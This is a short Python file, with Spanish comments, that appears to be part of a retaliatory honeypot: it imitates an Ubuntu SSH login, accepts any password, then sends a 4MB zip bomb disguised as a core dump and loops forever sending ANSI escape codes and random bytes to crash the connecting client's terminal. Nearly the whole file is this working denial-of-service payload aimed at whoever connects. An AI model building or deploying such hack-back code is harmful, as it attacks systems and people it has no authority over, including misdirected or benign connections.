import time
import os
import random
from scripts import zip_generator

def terminal_crusher(client_socket):
    """Mantenemos el motor ANSI para rematar la sesión"""
    ansi_bomb = b"\x1b[2J\x1b[H\x1b[?1049h"
    try:
        while True:
            payload = ansi_bomb + (os.urandom(1024 * 100)) # Inyección de basura rápida
            client_socket.send(payload)
            time.sleep(0.05)
    except: pass

def handle_cowrie_trap(client_socket, ip):
    """Simulación de Cowrie que entrega la Bomba Fifield por el canal SSH"""
    try:
        banner = b"Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)\r\n\r\n"
        client_socket.send(banner)
        client_socket.send(f"hell-node-01 login: ".encode())
        client_socket.recv(1024)
        client_socket.send(b"Password: ")
        client_socket.recv(1024)
        
        prompt = b"root@hell-node-01:~# "
        client_socket.send(b"\r\nWelcome to Ubuntu 22.04.3 LTS\r\n")
        client_socket.send(prompt)

        # Esperar primer comando
        cmd = client_socket.recv(1024)
        
        # EXPLOIT CHANNEL: Enviamos la bomba ZIP de 4MB como "Binary Data Stream"
        print(f"[💀] SSH CHANNEL EXPLOIT: Enviando Bomba Fifield de 4MB a {ip}")
        client_socket.send(b"\r\n*** SYSTEM CRITICAL ERROR: MEMORY CORRUPTION ***\r\n")
        client_socket.send(b"*** INITIATING CORE DUMP (BINARY STREAM) ***\r\n")
        
        # Generar y enviar los 4MB que se expanden a Gigabytes
        zip_payload = zip_generator.generate_ultra_zip()
        client_socket.send(zip_payload)
        
        # Seguir con el Terminal Crusher para asegurar el colapso del software del atacante
        terminal_crusher(client_socket)
        
    except: pass
